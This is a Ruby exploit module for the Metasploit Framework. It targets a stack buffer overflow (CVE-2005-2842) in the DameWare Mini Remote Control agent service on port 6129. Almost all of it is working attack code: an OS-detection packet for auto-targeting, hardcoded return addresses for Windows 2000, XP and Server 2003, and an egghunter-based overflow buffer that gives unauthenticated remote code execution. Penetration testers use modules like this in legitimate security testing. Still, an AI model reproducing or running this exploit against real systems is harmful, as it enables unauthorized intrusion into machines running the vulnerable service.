##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Egghunter
  include Msf::Exploit::Remote::Tcp

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'DameWare Mini Remote Control Client Agent Service <= v4 Stack Buffer Overflow',
      'Description'    => %q{
          This module exploits a vulnerability in the DWRCS.exe server of DameWare Mini
        Remote Control Client Agent 4.0 - 4.9. While processing a username, the application
        fails to do proper bounds checking before copying data into a small buffer on the stack.
        This causes a buffer overflow and allows to overwrite the base pointer and retn address
        on the stack, allowing for unauthenticated remote code execution. Also, the DWRCS.exe's 
        parent process should not terminate as multiple threads are created on connection. It is
        recommended that payloads with 'nonx' are choosen for exploitation.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Jackson Pollocks',                        # Initial discovery/exploit
          'mr_me <steventhomasseeley[at]gmail.com>', # msf port
        ],
      'References'     =>
        [
          ['CVE', '2005-2842'],
          ['BID', '14707'],
          ['OSVDB', '19119'],
          ['URL', 'http://www.exploit-db.com/exploits/1190/']
        ],
      'Payload'        =>
        {
          'BadChars'    => "\x00",
          'Space'       => 311,
          'DisableNops' => false,
          'Compact'     =>
           {
            'PayloadType' => 'cmd',
            'RequiredCmd' => 'generic telnet perl ruby'
          }
        },
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'none',
          'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform'       => 'win',
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          [ 'Automatic', {} ],
          [
            # No NX bypass, payload space too small
            'Windows Server 2003 SP2',
            {
              'Ret'    => 0x77384271, # JMP ESP [user32.dll]
              'Offset' => 195
            }
          ],
          [
            # No NX bypass, payload space too small
            'Windows XP SP3',
            {
              'Ret'    => 0x7E429353, # JMP ESP [user32.dll]
              'Offset' => 195
            }
          ],
          [
            # No NX bypass, payload space too small
            'Windows 2000 SP4',
            {
              'Ret'    => 0x77e3c256, # JMP ESP [user32.dll]
              'Offset' => 195
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Aug 31 2005",
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(6129)
      ], self.class)
  end

  # remote server auto-targeting, ftw
  def auto_target(check)
    os_maj = check[8].unpack('H*')[0]
    os_min = check[12].unpack('H*')[0]

    if os_maj == "05"
      if os_min == "02"
        print_status("Detected the target as Server 2003..")
        my_target = targets[1] # Win Server 23k
      elsif os_min == "01"
        print_status("Detected the target as Windows XP..")
        my_target = targets[2] # Win XP sp3
      elsif os_min == "00"
        print_status("Detected the target as Windows 2000..")
        my_target = targets[3] # Win 2000
      end

    elsif os_maj == "04"
      print_status("Detected the target as Windows NT..")
      print_status("Target unsupported..")
      my_target = Nil
    end

    return my_target
  end

  def exploit
    eggoptions =
    {
      :checksum => false,
      :eggtag => 'w00t',
    }

    # os detection
    os_pkt = ""
    os_pkt << "\x30\x11\x00\x00\x00\x00\x00\x00\xc3\xf5\x28\x5c\x8f\xc2\x0d\x40"
    os_pkt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    os_pkt << "\x00\x00\x00\x00\x01\x00\x00\x00"

    hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)

    connect

    sock.get_once()
    sock.put(os_pkt)

    my_target = target
    if my_target.name == 'Automatic'
      my_target = auto_target(sock.get_once())
    else
      sock.get_once
    end

    sploit = ""
    sploit << "\x10\x27"
    sploit << "\x00" * my_target['Offset']
    sploit << egg
    sploit << [my_target.ret].pack('V')
    sploit << hunter
    sploit << "\x00" * 5000

    print_status("Sending request...")
    sock.put(sploit)
    handler

    disconnect
  end
end
